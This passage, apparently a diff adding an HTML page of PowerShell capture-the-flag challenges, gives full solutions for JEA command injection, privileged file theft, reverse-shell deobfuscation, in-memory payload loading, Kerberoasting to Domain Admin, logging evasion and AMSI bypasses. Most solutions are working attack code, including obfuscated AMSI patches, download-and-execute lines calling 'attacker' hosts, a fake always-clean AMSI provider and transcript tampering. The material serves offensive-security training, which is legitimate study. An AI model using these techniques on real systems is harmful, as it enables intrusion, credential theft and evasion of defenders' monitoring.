+                <li><strong>Enumeration tool:</strong> PowerView (Get-DomainUser, Get-DomainGroup, Find-LocalAdminAccess)</li>
+                <li><strong>Credential extraction:</strong> Invoke-Kerberoast (Kerberoasting) + Invoke-Mimikatz (sekurlsa::logonpasswords)</li>
+                <li><strong>C2 server:</strong> 192.168.45.200:8080</li>
+                <li><strong>AMSI bypass:</strong> Yes — amsiInitFailed reflection method (first log entry)</li>
+                <li><strong>Exfiltration:</strong> Uploaded Kerberoast hashes to C2 via WebClient.UploadString</li>
+              </ol>
+            </details>
+          </div>
+        </div>
+
+        <!-- CTF 5 -->
+        <div class="card mb-3">
+          <div class="card-header"><h5>Challenge 5: JEA Jailbreak</h5></div>
+          <div class="card-body">
+            <p><strong>Scenario:</strong> You've connected to a JEA endpoint. The endpoint allows you to run a custom function <code>Get-UserReport</code> that takes a <code>-Username</code> parameter. The function internally uses <code>Invoke-Expression</code> to build a query. Exploit the injection vulnerability to escape JEA restrictions.</p>
+<pre><code class="language-powershell"># Vulnerable JEA function (running on target):
+# function Get-UserReport {
+#     param([string]$Username)
+#     $cmd = "Get-ADUser -Identity $Username -Properties *"
+#     Invoke-Expression $cmd | Select-Object Name, Email, LastLogon
+# }
+
+# Your session — you can only run:
+Get-Command
+# Shows: Get-UserReport, Get-Help, Exit-PSSession
+
+# Goal: Execute arbitrary commands through the injection</code></pre>
+            <details>
+              <summary><strong>Hints</strong></summary>
+              <ol>
+                <li>The <code>$Username</code> parameter is directly interpolated into an <code>Invoke-Expression</code> call</li>
+                <li>What if Username contains a semicolon and another command?</li>
+                <li>Remember: JEA runs as a virtual account with local admin privileges</li>
+              </ol>
+            </details>
+            <details>
+              <summary><strong>Solution</strong></summary>
+<pre><code class="language-powershell"># The function does: Invoke-Expression "Get-ADUser -Identity $Username -Properties *"
+# Inject by terminating the first command and adding our own
+
+# Attempt 1: Semicolon injection
+Get-UserReport -Username "admin; whoami"
+# Executes: Get-ADUser -Identity admin; whoami -Properties *
+# The "whoami" runs but "-Properties *" causes error (good enough)
+
+# Attempt 2: Subexpression injection
+Get-UserReport -Username '$(whoami)'
+# Executes: Get-ADUser -Identity $(whoami) -Properties *
+# The subexpression executes in the virtual account context
+
+# Attempt 3: Full command execution
+Get-UserReport -Username "admin; Get-Content C:\Users\Administrator\Desktop\flag.txt"
+
+# Attempt 4: Reverse shell (JEA virtual account = local admin)
+Get-UserReport -Username "admin; IEX (New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"
+
+# Attempt 5: Add yourself to local admins
+Get-UserReport -Username "admin; Add-LocalGroupMember -Group Administrators -Member 'DOMAIN\youruser'"
+
+# Key lesson: ANY parameter that flows into Invoke-Expression/IEX is dangerous
+# JEA with vulnerable functions = full compromise because RunAsVirtualAccount = admin</code></pre>
+            </details>
+          </div>
+        </div>
+
+        <!-- CTF 6 -->
+        <div class="card mb-3">
+          <div class="card-header"><h5>Challenge 6: WinRM Lateral Movement</h5></div>
+          <div class="card-body">
+            <p><strong>Scenario:</strong> You've compromised a workstation and found credentials in a scheduled task. The creds belong to a service account that has PSRemoting access to the file server (FS01). Enumerate what you can access and exfiltrate the flag from the admin's home directory.</p>
+<pre><code class="language-powershell"># Given credentials (found in scheduled task XML)
+$username = "CORP\svc_backup"
+$password = ConvertTo-SecureString "B@ckup2024!" -AsPlainText -Force
+$cred = New-Object PSCredential($username, $password)
+
+# Target: FS01.corp.local
+# Goal: Read C:\Users\admin.da\Desktop\flag.txt on FS01</code></pre>
+            <details>
+              <summary><strong>Hints</strong></summary>
+              <ol>
+                <li>Use <code>Enter-PSSession</code> or <code>Invoke-Command</code> with the credentials</li>
+                <li>Check what permissions the service account has</li>
+                <li>Service accounts named "backup" often have <code>SeBackupPrivilege</code></li>
+                <li>SeBackupPrivilege allows reading ANY file regardless of ACLs</li>
+              </ol>
+            </details>
+            <details>
+              <summary><strong>Solution</strong></summary>
+<pre><code class="language-powershell"># Step 1: Establish remote session
+$session = New-PSSession -ComputerName FS01.corp.local -Credential $cred
+
+# Step 2: Enumerate privileges
+Invoke-Command -Session $session -ScriptBlock { whoami /priv }
+# Should show SeBackupPrivilege
+
+# Step 3: Check if we can directly read the file
+Invoke-Command -Session $session -ScriptBlock { 
+    Get-Content C:\Users\admin.da\Desktop\flag.txt 
+}
+# Might fail due to ACL (even with SeBackupPrivilege, need to use backup API)
+
+# Step 4: Use backup privilege properly (robocopy uses backup semantics)
+Invoke-Command -Session $session -ScriptBlock {
+    # Robocopy with /B flag uses backup privilege
+    robocopy "C:\Users\admin.da\Desktop" "C:\Windows\Temp\loot" "flag.txt" /B
+    Get-Content "C:\Windows\Temp\loot\flag.txt"
+    Remove-Item "C:\Windows\Temp\loot" -Recurse -Force
+}
+
+# Alternative: Use .NET with FILE_FLAG_BACKUP_SEMANTICS
+Invoke-Command -Session $session -ScriptBlock {
+    Add-Type -TypeDefinition @'
+    using System;
+    using System.IO;
+    using System.Runtime.InteropServices;
+    public class BackupReader {
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, 
+            uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, 
+            uint dwFlagsAndAttributes, IntPtr hTemplateFile);
+        
+        public static string ReadWithBackup(string path) {
+            // FILE_FLAG_BACKUP_SEMANTICS = 0x02000000
+            IntPtr handle = CreateFile(path, 0x80000000, 1, IntPtr.Zero, 3, 0x02000000, IntPtr.Zero);
+            using (var fs = new FileStream(new Microsoft.Win32.SafeHandles.SafeFileHandle(handle, true), FileAccess.Read))
+            using (var sr = new StreamReader(fs))
+                return sr.ReadToEnd();
+        }
+    }
+'@
+    [BackupReader]::ReadWithBackup("C:\Users\admin.da\Desktop\flag.txt")
+}
+
+# Cleanup
+Remove-PSSession $session</code></pre>
+            </details>
+          </div>
+        </div>
+
+        <!-- CTF 7 -->
+        <div class="card mb-3">
+          <div class="card-header"><h5>Challenge 7: Deobfuscation Challenge</h5></div>
+          <div class="card-body">
+            <p><strong>Scenario:</strong> Incident response found the following obfuscated PowerShell script in an attacker's staging directory. Deobfuscate it to determine what it does and extract the C2 address and encryption key.</p>
+<pre><code class="language-powershell"># Captured obfuscated script:
+${;} = [char]0x49 + [char]0x45 + [char]0x58
+$_xx = [Convert]::FromBase64String('TmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoIjEwLjEwLjk5LjQ0IiwgNDQ0Myk=')
+$_yy = [Text.Encoding]::UTF8.GetString($_xx)
+$_k = -join([char[]]@(0x41,0x45,0x53,0x2d,0x4b,0x45,0x59,0x2d,0x53,0x33,0x43,0x52,0x33,0x54,0x21))
+${~~} = @'
+$c = ~~~REPLACE_YY~~~
+$s = $c.GetStream()
+[byte[]]$b = 0..65535|%{0}
+while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
+    $d = (New-Object Text.ASCIIEncoding).GetString($b,0,$i)
+    $r = (IEX $d 2>&1 | Out-String)
+    $rb = ([text.encoding]::ASCII).GetBytes($r + "PS " + (pwd).Path + "> ")
+    $s.Write($rb,0,$rb.Length)
+    $s.Flush()
+}
+$c.Close()
+'@
+${~~} = ${~~}.Replace('~~~REPLACE_YY~~~', $_yy)
+& ([scriptblock]::Create(${;})) ${~~}</code></pre>
+            <details>
+              <summary><strong>Solution</strong></summary>
+<pre><code class="language-powershell"># Deobfuscation step by step:
+
+# 1. ${;} = "IEX" (0x49=I, 0x45=E, 0x58=X)
+# This is Invoke-Expression
+
+# 2. $_xx base64 decodes to:
+[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoIjEwLjEwLjk5LjQ0IiwgNDQ0Myk='))
+# Result: 'New-Object Net.Sockets.TCPClient("10.10.99.44", 4443)'
+
+# 3. $_k decodes to:
+-join([char[]]@(0x41,0x45,0x53,0x2d,0x4b,0x45,0x59,0x2d,0x53,0x33,0x43,0x52,0x33,0x54,0x21))
+# Result: "AES-KEY-S3CR3T!"
+
+# 4. The here-string is a reverse shell template
+# After replacement, the full script is a TCP reverse shell connecting to 10.10.99.44:4443
+
+# ANSWERS:
+# - C2 Address: 10.10.99.44:4443
+# - Encryption Key: AES-KEY-S3CR3T! (stored but not used in this variant — likely for later stage)
+# - Functionality: TCP reverse shell (read commands, execute, return output)
+# - Method: IEX via scriptblock creation for evasion</code></pre>
+            </details>
+          </div>
+        </div>
+
+        <!-- CTF 8 -->
+        <div class="card mb-3">
+          <div class="card-header"><h5>Challenge 8: PowerView Enumeration Race</h5></div>
+          <div class="card-body">
+            <p><strong>Scenario:</strong> You have 5 minutes on a compromised domain workstation before the SOC notices. Using PowerView (or AD module), answer these questions about the corp.local domain. Each answer is worth points.</p>
+            <p><strong>Questions:</strong></p>
+            <ol>
+              <li>How many users have SPNs set? (Kerberoastable accounts)</li>
+              <li>Who are the members of "Domain Admins" (recursive)?</li>
+              <li>Which computers have Unconstrained Delegation enabled?</li>
+              <li>Find any users with "password" in their description field</li>
+              <li>What trusts does the domain have?</li>
+              <li>Which machines does the current user have local admin access to?</li>
+              <li>Find any GPOs that modify local admin group membership</li>
+            </ol>
+            <details>
+              <summary><strong>Solution Script</strong></summary>
+<pre><code class="language-powershell"># Speed enumeration script — run all at once
+$results = @{}
+
+# Q1: Kerberoastable accounts
+$results['Kerberoastable'] = (Get-DomainUser -SPN | Measure-Object).Count
+Write-Host "[1] Kerberoastable users: $($results['Kerberoastable'])"
+
+# Q2: Domain Admins (recursive)
+$results['DomainAdmins'] = Get-DomainGroupMember -Identity "Domain Admins" -Recurse | 
+  Select-Object MemberName, MemberDomain
+Write-Host "[2] Domain Admins:" 
+$results['DomainAdmins'] | Format-Table
+
+# Q3: Unconstrained Delegation
+$results['Unconstrained'] = Get-DomainComputer -Unconstrained | Select-Object dnshostname
+Write-Host "[3] Unconstrained Delegation:"
+$results['Unconstrained'] | Format-Table
+
+# Q4: Passwords in descriptions
+$results['PasswordInDesc'] = Get-DomainUser -LDAPFilter "(description=*pass*)" | 
+  Select-Object samaccountname, description
+Write-Host "[4] Password in description:"
+$results['PasswordInDesc'] | Format-Table
+
+# Q5: Domain trusts
+$results['Trusts'] = Get-DomainTrust | Select-Object SourceName, TargetName, TrustDirection, TrustType
+Write-Host "[5] Trusts:"
+$results['Trusts'] | Format-Table
+
+# Q6: Local admin access (SLOW — reduce threads if needed)
+$results['LocalAdmin'] = Find-LocalAdminAccess -Threads 30
+Write-Host "[6] Local admin on:"
+$results['LocalAdmin']
+
+# Q7: GPOs modifying local admins
+$results['GPO'] = Get-DomainGPO | Where-Object { 
+    $_.gpcfilesyspath | ForEach-Object { 
+        (Get-Content "$_\Machine\Preferences\Groups\Groups.xml" -ErrorAction SilentlyContinue) -match "Administrators" 
+    }
+} | Select-Object displayname, gpcfilesyspath
+Write-Host "[7] GPOs modifying admins:"
+$results['GPO'] | Format-Table
+
+# Export everything
+$results | ConvertTo-Json -Depth 5 | Set-Content C:\Windows\Temp\enum.json</code></pre>
+            </details>
+          </div>
+        </div>
+
+        <!-- CTF 9 -->
+        <div class="card mb-3">
+          <div class="card-header"><h5>Challenge 9: Memory-Only Payload Delivery</h5></div>
+          <div class="card-body">
+            <p><strong>Scenario:</strong> Deliver and execute a C# payload entirely in memory. The target has:</p>
+            <ul>
+              <li>Application whitelisting (only signed Microsoft binaries allowed)</li>
+              <li>AMSI active (you must bypass first)</li>
+              <li>Script Block Logging enabled (you'll be logged, but need to succeed)</li>
+              <li>No PowerShell v2 available</li>
+            </ul>
+            <p><strong>Goal:</strong> Load a custom .NET assembly into memory and call its entry point without dropping any file to disk.</p>
+            <details>
+              <summary><strong>Hints</strong></summary>
+              <ol>
+                <li>You'll need to bypass AMSI first (see Challenge 2)</li>
+                <li><code>[System.Reflection.Assembly]::Load([byte[]]$bytes)</code> loads from memory</li>
+                <li>Download the assembly bytes via WebClient</li>
+                <li>The assembly can use P/Invoke internally (it's not constrained)</li>
+              </ol>
+            </details>
+            <details>
+              <summary><strong>Solution</strong></summary>
+<pre><code class="language-powershell"># Full attack chain:
+
+# Step 1: AMSI Bypass (obfuscated)
+$z=[Ref].Assembly.GetType((-join(@(83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115)|%{[char]$_})))
+$z.GetField((-join(@(97,109,115,105,73,110,105,116,70,97,105,108,101,100)|%{[char]$_})),'NonPublic,Static').SetValue($null,$true)
+
+# Step 2: Download assembly bytes (in-memory, no disk)
+$wc = New-Object Net.WebClient
+$wc.Proxy = [Net.WebRequest]::GetSystemWebProxy()
+$wc.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
+$bytes = $wc.DownloadData("http://attacker-server/payload.dll")
+
+# Step 3: Load assembly from byte array (never touches disk)
+$assembly = [System.Reflection.Assembly]::Load($bytes)
+
+# Step 4: Find and invoke entry point
+$type = $assembly.GetType("Payload.Program")
+$method = $type.GetMethod("Main", [Reflection.BindingFlags]::Static -bor [Reflection.BindingFlags]::Public)
+$method.Invoke($null, @(,@([string]::Empty)))
+
+# Alternative: If entry point varies
+$assembly.GetExportedTypes() | ForEach-Object {
+    $_.GetMethods() | Where-Object { $_.IsStatic -and $_.Name -eq "Execute" }
+} | ForEach-Object { $_.Invoke($null, $null) }
+
+# The C# assembly (compiled separately) can contain:
+# - Shellcode execution via VirtualAlloc + CreateThread
+# - Process injection
+# - Credential dumping
+# - Any Win32 API calls via DllImport
+# All running inside the PowerShell process (no new process created)</code></pre>
+            </details>
+          </div>
+        </div>
+
+        <!-- CTF 10 -->
+        <div class="card mb-3">
+          <div class="card-header"><h5>Challenge 10: Full Attack Chain — From Shell to Domain Admin</h5></div>
+          <div class="card-body">
+            <p><strong>Scenario:</strong> You've obtained a low-privilege PowerShell session on WORKSTATION01 (corp.local domain). Chain together multiple techniques to achieve Domain Admin. The environment has:</p>
+            <ul>
+              <li>AMSI enabled on all machines</li>
+              <li>Script Block Logging enabled</li>
+              <li>AppLocker in Audit mode (logs but doesn't block)</li>
+              <li>WinRM enabled between machines</li>
+              <li>A Kerberoastable service account (svc_sql) with a weak password</li>
+              <li>svc_sql has GenericAll on the "Domain Admins" group</li>
+            </ul>
+            <p><strong>Attack path:</strong> Bypass AMSI → Load tools → Kerberoast svc_sql → Crack hash → Use GenericAll to add self to DA</p>
+            <details>
+              <summary><strong>Solution</strong></summary>
+<pre><code class="language-powershell"># === PHASE 1: AMSI Bypass ===
+$x=[Ref].Assembly.GetType((-join(@(83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115)|%{[char]$_})))
+$x.GetField((-join(@(97,109,115,105,73,110,105,116,70,97,105,108,101,100)|%{[char]$_})),'NonPublic,Static').SetValue($null,$true)
+Write-Host "[+] AMSI bypassed" -ForegroundColor Green
+
+# === PHASE 2: Load PowerView ===
+IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')
+Write-Host "[+] PowerView loaded" -ForegroundColor Green
+
+# === PHASE 3: Enumerate Kerberoastable Accounts ===
+$spnUsers = Get-DomainUser -SPN -Properties samaccountname, serviceprincipalname
+$spnUsers | Format-Table samaccountname, serviceprincipalname
+Write-Host "[+] Found $($spnUsers.Count) Kerberoastable accounts" -ForegroundColor Green
+
+# === PHASE 4: Kerberoast svc_sql ===
+# Request TGS ticket for the SPN
+Add-Type -AssemblyName System.IdentityModel
+$ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/db01.corp.local:1433"
+$bytes = $ticket.GetRequest()
+
+# Or use Invoke-Kerberoast (from PowerView/Rubeus)
+$hash = Invoke-Kerberoast -Identity svc_sql -OutputFormat Hashcat
+$hash.Hash | Set-Content C:\Windows\Temp\hash.txt
+Write-Host "[+] Got TGS hash for svc_sql" -ForegroundColor Green
+
+# === PHASE 5: Crack offline (on attacker machine) ===
+# hashcat -m 13100 hash.txt wordlist.txt
+# Result: svc_sql : Summer2024!
+Write-Host "[+] Cracked password: Summer2024!" -ForegroundColor Green
+
+# === PHASE 6: Verify GenericAll on Domain Admins ===
+$cred = New-Object PSCredential("CORP\svc_sql", (ConvertTo-SecureString "Summer2024!" -AsPlainText -Force))
+# Check ACL
+$acl = Get-ObjectAcl -Identity "Domain Admins" -ResolveGUIDs | 
+  Where-Object { $_.IdentityReference -match "svc_sql" }
+Write-Host "[+] svc_sql has: $($acl.ActiveDirectoryRights) on Domain Admins" -ForegroundColor Green
+
+# === PHASE 7: Add current user to Domain Admins ===
+# Use svc_sql's credentials to modify the group
+$currentUser = [Environment]::UserName
+Invoke-Command -ScriptBlock {
+    Add-ADGroupMember -Identity "Domain Admins" -Members $using:currentUser
+} -Credential $cred -ComputerName dc01.corp.local
+
+# Or via PowerView:
+Add-DomainGroupMember -Identity "Domain Admins" -Members $currentUser -Credential $cred
+
+# === PHASE 8: Verify ===
+Get-DomainGroupMember -Identity "Domain Admins" | Where-Object { $_.MemberName -eq $currentUser }
+Write-Host "[+] SUCCESS: $currentUser is now Domain Admin!" -ForegroundColor Green
+
+# === PHASE 9: Access DC ===
+Enter-PSSession -ComputerName dc01.corp.local
+# whoami → CORP\your_user (Domain Admin)</code></pre>
+            </details>
+          </div>
+        </div>
+
+        <!-- CTF 11 -->
+        <div class="card mb-3">
+          <div class="card-header"><h5>Challenge 11: Stealth Logger Evasion</h5></div>
+          <div class="card-body">
+            <p><strong>Scenario:</strong> You must execute a reconnaissance script on a host with <strong>all three</strong> logging mechanisms enabled (Script Block Logging, Module Logging, and Transcription). Your goal: execute your commands while generating minimal/misleading log entries.</p>
+            <p><strong>Constraints:</strong> Cannot disable logging (no admin), cannot clear logs.</p>
+            <details>
+              <summary><strong>Hints</strong></summary>
+              <ol>
+                <li>Script Block Logging captures what's <em>compiled</em> — but what about commands run from a child process?</li>
+                <li>Transcription logs to a file — can you find and modify the transcript?</li>
+                <li>Running commands via <code>cmd.exe</code> or <code>wmic</code> from PowerShell may not generate PS logs</li>
+                <li>Consider using .NET methods that don't go through the PowerShell pipeline</li>
+              </ol>
+            </details>
+            <details>
+              <summary><strong>Solution</strong></summary>
+<pre><code class="language-powershell"># Technique 1: Execute via cmd.exe (not logged in PS operational log)
+cmd.exe /c "whoami & net user & net localgroup Administrators & ipconfig /all"
+
+# Technique 2: Use .NET directly (bypasses Module Logging pipeline)
+[System.Net.Dns]::GetHostEntry("dc01.corp.local")  # DNS lookup without cmdlet
+[System.IO.Directory]::GetFiles("C:\Users", "*", [System.IO.SearchOption]::AllDirectories)
+
+# Technique 3: WMI (separate logging channel)
+Get-WmiObject Win32_Process -Filter "Name='lsass.exe'" | Select-Object ProcessId, CommandLine
+
+# Technique 4: Use Background Runspace (may avoid transcription in main session)
+$runspace = [RunspaceFactory]::CreateRunspace()
+$runspace.Open()
+$pipeline = $runspace.CreatePipeline()
+$pipeline.Commands.AddScript("Get-Process; Get-Service; whoami /all")
+$results = $pipeline.Invoke()
+$runspace.Close()
+# Results are in $results but weren't typed in the transcribed session
+
+# Technique 5: Find and tamper with transcript file (if writable)
+$transcriptDir = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -ErrorAction SilentlyContinue).OutputDirectory
+if ($transcriptDir) {
+    $files = Get-ChildItem $transcriptDir -Recurse -Filter "*.txt" | Sort-Object LastWriteTime -Descending
+    # If writable, could append misleading content or corrupt
+}
+
+# Technique 6: For maximum stealth, use a different scripting engine entirely
+# VBScript/JScript also log but to different channels
+cscript.exe /nologo C:\Windows\Temp\recon.js  # JavaScript-based recon
+
+# Bottom line: PS logging is comprehensive but not inescapable
+# The SOC will see SOMETHING, but the content can be obscured</code></pre>
+            </details>
+          </div>
+        </div>
+
+        <!-- CTF 12 -->
+        <div class="card mb-3">
+          <div class="card-header"><h5>Challenge 12: Custom AMSI Provider Poisoning</h5></div>
+          <div class="card-body">
+            <p><strong>Scenario:</strong> You have local admin on a system where the standard AMSI memory patches are being detected by an EDR hooking <code>VirtualProtect</code>. The EDR alerts on any attempt to modify memory protections on amsi.dll. Find an alternative AMSI bypass that doesn't involve patching memory.</p>
+            <p><strong>Constraints:</strong></p>
+            <ul>
+              <li>Cannot patch AmsiScanBuffer (EDR hooks VirtualProtect on amsi.dll pages)</li>
+              <li>Cannot use amsiInitFailed (EDR monitors that field via periodic checks)</li>
+              <li>Have local admin access</li>
+              <li>Must persist across new PowerShell sessions</li>
+            </ul>
+            <details>
+              <summary><strong>Hints</strong></summary>
+              <ol>
+                <li>AMSI providers are registered via COM (registry-based)</li>
+                <li>Per-user COM registrations (HKCU) take precedence over machine (HKLM)</li>
+                <li>What if the AMSI DLL path points to something that always returns "clean"?</li>
+                <li>You could also unregister all providers entirely</li>
+              </ol>
+            </details>
+            <details>
+              <summary><strong>Solution</strong></summary>
+<pre><code class="language-powershell"># Method 1: COM Server Hijack via HKCU (persists, no memory patching)
+# The AMSI COM server CLSID: {fdb00e52-a214-4aa1-8fba-4357bb0072ec}
+
+# Create HKCU override (takes precedence over HKLM)
+$clsid = "{fdb00e52-a214-4aa1-8fba-4357bb0072ec}"
+$regPath = "HKCU:\Software\Classes\CLSID\$clsid\InProcServer32"
+New-Item -Path $regPath -Force | Out-Null
+# Point to a non-existent DLL — AMSI fails to load, defaults to "clean"
+Set-ItemProperty -Path $regPath -Name "(default)" -Value "C:\IDontExist.dll"
+Set-ItemProperty -Path $regPath -Name "ThreadingModel" -Value "Both"
+
+# New PowerShell sessions will now fail to initialize AMSI properly
+# Test in new process:
+Start-Process powershell -ArgumentList '-Command', '"Invoke-Mimikatz"; Write-Host "Not blocked!"'
+
+# Method 2: Remove all AMSI providers (requires admin on HKLM)
+$providersPath = "HKLM:\SOFTWARE\Microsoft\AMSI\Providers"
+Get-ChildItem $providersPath | ForEach-Object {
+    # Rename to backup rather than delete (less destructive)
+    Rename-Item $_.PSPath "$($_.PSPath)_disabled"
+}
+# No providers = nothing to scan content against
+
+# Method 3: Create a fake AMSI provider DLL that always returns clean
+# Compile this C# to a DLL and register as the AMSI provider</code></pre>
+
+<pre><code class="language-csharp">// FakeAmsi.cs — Always returns AMSI_RESULT_CLEAN
+// Compile: csc /target:library /out:FakeAmsi.dll FakeAmsi.cs
+using System;
+using System.Runtime.InteropServices;
+
+[ComVisible(true)]
+[Guid("2781761E-28E0-4109-99FE-B9D127C57AF0")]  // Custom GUID
+[ClassInterface(ClassInterfaceType.None)]
+public class FakeAmsiProvider // : IAntimalwareProvider (interface not public)
+{
+    public int Scan(/* IAmsiStream */ IntPtr stream, out int result)
+    {
+        result = 0;  // AMSI_RESULT_CLEAN = 0
+        return 0;    // S_OK
+    }
+    
+    public void CloseSession(ulong session) { }
+    public string DisplayName => "Totally Legit AV";
+}</code></pre>
+
+<pre><code class="language-powershell"># Register fake provider:
+# 1. Compile DLL
+# 2. Register COM: regsvr32 FakeAmsi.dll (or manual registry entries)
+# 3. Add GUID to HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{your-guid}
+
+# This approach:
+# - No memory modification (EDR can't detect)
+# - Persists across sessions and reboots
+# - No amsiInitFailed manipulation
+# - Survives PowerShell updates</code></pre>
+            </details>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+
+</div>
+</body>
+</html>
